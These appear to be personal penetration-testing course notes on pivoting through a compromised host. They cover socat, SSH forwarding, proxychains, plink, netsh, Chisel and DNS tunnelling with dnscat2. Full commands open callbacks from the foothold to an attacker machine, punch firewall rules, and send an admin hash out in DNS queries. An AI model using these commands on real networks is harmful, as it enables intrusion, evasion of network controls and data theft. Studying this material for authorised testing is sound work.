# Port Redirecting and Tunneling
Port redirecting and tunneling may be needed due to network segmenting and firewalls
## Port forwarding in Linux
When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination
Suppose we gain control of a server with two network NICs. Port forwarding will be needed to talk to machines not on our subnet
We can use `ip addr` and `ip route` to gain more info on the network topology
For example: if we dicover the IP address and user/pass of a postgress server in the DMZ, but the machine we have a foothold on doesn't have the postgress client, we can create a port that listens for input on the WAN, and forwards all traffic to the Postgress server
## Using Socat
In our example we can use .socat to connect to the Postgress server.
We want to open port 2345 on our foothold and forward all traffic through it to port 5432 on the Postgress server
![[Pasted image 20230908075825.png]]
==IN this example we find socat installed on the server, but if it is not installed it is possible to download and run a statically-linked binary version instead==
On th efoothold we will start a verbose Socat process
```bash
socat -ddd TCP-LISTEN:2345, fork TCP:10.4.50.215:5432
```
This creates the tunnel for our network which now looks like this
![[Pasted image 20230908080150.png]]
To connect to the postgress server, we now can use the client on the kali machine and send traffic to the listening  port on the foothold
```bash
psql -h 192.168.50.63 -p 2345 -U postgres
\l
```
Now we can enumerate the postgress database. If any other services are identified we will need to set up tunnels to access them.
Other tools we can use are rinetd or Netcat combiend with a FIFO named pipe
Erik also mentioned chisel as a tool

## SSH Tunnelling
Tunnelling is the act of encapsulating data of one kind of data stream within another as it travels across the network
SSH is useful for this --> we can pass almost any kind of data through ssh
### SSH Local Port Forwarding
In the previous example there was one host that listed and forwarded the traffic.
With SSH Local port forwarding, packets are not forwarded by the same host that listens for packets
Instead an ssh connection is made between the two hosts (client and server) and the client opens up
a listening port. All packets received on the listening port are tunneled through an ssh conenction to the server. The packets are then forwarded by the server to the socket we specify.
![[Pasted image 20230909090415.png]]
**This is useful if there are multiple layers of subnets or socat is not available**

A local port forward can be set up using OpenSSH's -L option, which takes two sockets in the form of IPADDRESS:PORT separated by a colon, so the whole format looks like IPADDRESS:PORT:IPADDRESS:PORT
	The first socket is the listening socket that will be bound to the ssh client machine
	The second socket is where we want to forward packets to --> this is the final destination, so the rightmost server in our example picture 
when running the ssh command, we will supply the credentials of the server that will be forwarding the packets to the target destination. In this example that is the sql server (center right)
We use -N to prevent a shell from being opened
```bash
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```
In this example port 4455 on the ssh client was already set up for listening
Generically this is
```bash
ssh -N -L sshclient:listeningport:final_destination:target_port sshserveruser@sshserver
```
==Once we execute the ssh commna d with -N no shell will be opened and no fruther commands can be entered ont hat shell --> this is normal. We need to keep the process running and communicate through the listening port now==
a second shell on our ssh client will need to be opened to check the validity of the tunnel

### SSH dynamic port forwarding

Local port forwarding has one limitation, there can only be one target destination
We can Dynamic port forwarding, supported by openssh to overcome this limitation.
Dynamic port forwarding works because it uses SOCKS protocol. SOCKS ecapsulates data with a prtocol that says where the end target is. If the ssh server can route to it, it will.
in our example we could now access all ports past the postgress server's second Nic
![[Pasted image 20230912173822.png]]
to obtain this we need to set up our tunnel using the -D flag ==AND== use a SOCKs compatible software like *proxychains* to encapsulate data
**Again make sure to upgrade to a full tty shell before running ssh command**
With dynamic port forwarding we only need to specify the listening port and our ssh server user@ip
```bash
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```
Generically this is
```bash
ssh -N -D 0.0.0.0:<client listening port> <sshserveruser>@<sshserverip>
```
remember that ssh server is the server we are routing through to reach the final destination/other network, not the final destination itself

To use our dynamic tunnel we need to send commands from kali using a SOCKS proxy. We can use Proxychains, but note we must used dynamically linked libraries for it to work
	we need to edit the config file located at /etc/proxychains4.conf
	proxies are defined at the end of the file in the order of proxy type, ip address, port of socks proxy
	in our example the proxy would be configured in the file like `socks5 192.168.50.63 9999`
We can now specify proxychains before our desired command to use the dynamic forwarding tunnel
```bash
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```

### SSH Remote Port Forwarding
All of the example so far involve us binding to a listening port inside of a network --> this is much more likely to get stopped by a firewall
Instead, we can use remote port forwarding to get a machine inside the network to call out to us --> this is like a reverse shell, but we are binding to a listening port
**One difference with this is that the listening port is now on the ssh server instead of the ssh client**
We will run the ssh command with the -R flag for remote port forwarding
```bash
ssh -N -R 127.0.0.1:2345:10.4.50.21:5432 kali@192.168.118.4
```
I this case we want to listen on port 2345 and forward all traffic to the Postgress SQL port on on PSOTGRES Server (10.4.50.215)
Generally this command is
```bash
ssh -N -R 127.0.0.1:<kali listener>:<Target IP>:<Target Port> kali@<kali IP
```
This command is still run from the server we gained an initial foothold on
Now we run commands on kali to our local listening port and it will be forwarded to the target server
```bash
psql -h 127.0.0.1 -p 2345 -U postgres
```

## SSH Remote Dynamic Port Forwarding
==Note we need Openssh 7.6 or greater on the SSH Client to do this==
Same concept as local dynamic forwarding, but now we have the listener on the kali box like before
![[Pasted image 20230913055906.png]]
One big advantage of this is we can also reach other machines that are in the same DMZ, but behind a firewall completely
![[Pasted image 20230913055959.png]]
To use dynamic remote forwarding, we use the -R flag, and we only need to specify the listening port on the ssh server. By default it will be bound to the loopback interface of the ssh server. Again in this example our initial foothold is the ssh client calling back to the kali machine
```bash
ssh -N -R 9998 kali@192.168.118.4
```
Generally, that is
```bash
ssh -N -R <ssh server listening port> <ssh server user>@<server IP>
```
Where our server will usually be the kali linux box
**Don't forget to update the proxychains conf with the new proxy port**
In the case of this example, we list the proxy as `socks5 127.0.0.1 9998`
Now we are set to run commands with Proxychains and reach beyond the initial foothold

### Using SSHuttle
If wwe have direct access to an ssh server and root on the client, we may be able to run sshuttle. This is also requires python on the ssh server
We set up a listening port on our foothold using socat
```bash
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```
Next we can run sshuttle from kali, specifying the ssh string we want to use and the subnets to route through
```bash
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
```
We won't get much output, but if done correctly we can now access components on the internal network shown above
Note, database admin is the user we are connecting to the ssh server (Postgress server in example), not the foothold which was the ssh client

## Port forwarding with Windows tools
### ssh.exe
oppen ssh has been bundled with windows since April 2018. If it is present will will find: scp.exe, sftp.exe. ssh.exe along with other ssh-\* utilities in %systemdrive%\\Windows\\System32\\OpenSSH

We can use ssh just like linux to create port forwards to any machine

### Plink.exe
Admins may not want to leave ssh on machines. We may be able to use PuTTY or it's command line only counterpart, plink.
**Plink has many features of Openssh, but it cannot do remote dynamic forwarding**
![[Pasted image 20230914060411.png]]
In our example we will use the network above where MULTISERV has an exposed web app on port 80
In this example the web page is pre compromised and we can navigate to a page to execute arbitrary commands
To set us up for the forward, we do the following
	download nc.exe via webserver
		**We have windows executables under /usr/share/windows-resources/binaries**
	connect back to Kali
	download Plink via web server
Once plink.exe is downloaded, we can use it to remote forward a port
We have to supply username and password on the command line using -l and -pw flags
We still use -R to specify remote forward with the same socket scheme as above
```cmd
plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```
In this example we wanted to forward traffic to the RDP service on our intial foothold
Generally this is
```cmd
plink.exe -ssh -l kali -pw kali -R <local kali loopback>:<kali listening port>:<target IP relative to foothold>:<target port> <kali IP>
```
We may run into the issue where we cannot accept the prompt to store the ssh key on non tty shells.
to get around this we can pipe in an echo y when running
```cmd
cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7
```
![[Pasted image 20230914061950.png]]
We have now set up a tunnel for the multiserver to forward rdp traffic to itself, so we can access the service. We access it by sending traffic to our local listening port
```bash
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
```
### Netsh
There is a native firewall tool, netsh, we can use to set up a port forward
Note, this requires administrative privilege and we need to take UAC into account --> we will need an RDP shell to do
Open a cmd prompt as admin
We can instruct netsh to add a portproxy rule on an interface
```
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
```
v4tov4 - Ipv4 to Ipv4
In this example we open a listening port on the WAN interface of our foothold and forward to the ssh port on an internal network machine
Now we need to add a firewall rule, so we can access the listening port from our kali machine.
```cmd
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
```
dir=in specifies the direction of the connection
Now we can ssh to port 2222 on our foothold and interact with the machine on the internal network
```bash
ssh database_admin@192.168.50.64 -p2222
```
*Don't forget to delete these connections when done*
```cmd
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
```
and
```cmd
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
```

## HTTP Tunneling
There may be a scenario where network traffic is heavily restricted, and we cannot call a reverse shell or port forward using ssh. --> We can try http tunneling
If we have access to a webserver this is indicative of http traffic being allowed
### Http Tunneling with Chisel
Chisel is an http tunneling tool. It also uses ssh within http so our data can be encrypted
Chisel uses a server client model. A chisel server must be setup that can accept clients
Many port forwarding options are available
One useful one is *reverse port forwarding* --> similar to ssh remote port forwarding
Note: Chisel is able to run on Linux windows and MacOS
We run the Chisel server on our Kali machine which will accept a connection from a chisel client on our foothold
Chisel will bind to a SOCKS proxy port on kali
**We will need to copy the chisel executable to the client/foothold as well** --> make sure we copy the proper binary for the proper architecture of the client
In this example both machines are amd64 linux machines
Once chisel is copied to the client we can start the server on kali
```bash
chisel server --port 8080 --reverse
```
server indicates we are the server
port is the listening port
reverse indicates we are expecting a call back from the client
on the client we want to run the command
```bash
/tmp/chisel client <kali IP>:<chisel listening port> R:socks > /dev/null2>&1 &
```
R specifies a reverse tunnel using a socks proxy --> *This is port 1080 by default. Unsure if I have to set up in Kali beforehand*
`> /dev/null2>&1 &` forces the shell to run in the background
In our example the command looks like this
```bash
/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &
```
once this is run we can check our connections using netstat or we can set up TCP dump to monitor port 8080 beforehand and we can see traffic connecting
Now that the tunnel is setup, we can use it by invoking ssh with the proxycommands option, -o
	The version of netcat/nc that comes with kali cannot handle proxy commands, so instead we use the alternative Ncat when working with the ssh proxy commands
Now we can construct an ssh proxy command that will tell Ncat to use socks5 protocol at the proxy socket 127.0.0.1:1080.
```bash
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
```
%h specifies target host (database_admin@\<ip\>, which will be filled in by the ssh command
%p specifies target port which will be filled in by the ssh command

### DNS Tunnelling
Because systems need to make DNS queries for hosts they don't know the path to, we can exfiltrate data by making queries to noextistant domains if we control a local authoritave DNS server of that domain
Example
```bash
nslookup <admin hash>.example.com
```
Generally that is
```bash
nslookup <data>.<domain we control>
```
We receive the data by montioring a TCP dump on the dns server we control. for example
`sudo tcpdump -i ens192 udp port 53`
If we want to infiltrate data, we can use the TXT records of the DNS server.
If we edit the dnsmasq_txt.conf file we can place arbitrary data under "#TXT record"
The **dnsmasq_txt.conf** contains two extra lines starting with "txt-record=". Each of these lines represents a TXT record that Dnsmasq will serve. Each contains the domain the TXT record is for, then an _arbitrary string attribute_, separated by a comma. From these two definitions, any TXT record requests for `<example site>` should return the strings "here's something useful!" and "here's something else less useful.".

We can use the tool dnscat2 to infiltrate and exfiltrate data on a DNS server
Set up a TCP dump to inspect traffic for DNS
```bash
sudo tcpdump -i ens192 udp port 53
```
On the DNS server we run dnscat2 with our domain as the only argument
```bash
dnscat2-server feline.corp
```

On the client (target machine) we run dnscat with the domain as the only argument
```bash
./dnscat feline.corp
```
Thus should connect us back to our DNS server if we are running on the authoritative server
send the command `windows` to see active windows
and `windows -i <target>` to switch windows
We want to switch to the command window --> On the DNS server, we now have a limited set of commands. type ? to see them
We can use the listen command to set up a listening port on our DNS server and push tcp traffic through the dns tunnel --> this operates like ssh -L
```
listen <lhost:lport> <rhost:rport>
```
We should now be able to access the remote port through another shell on the DNS server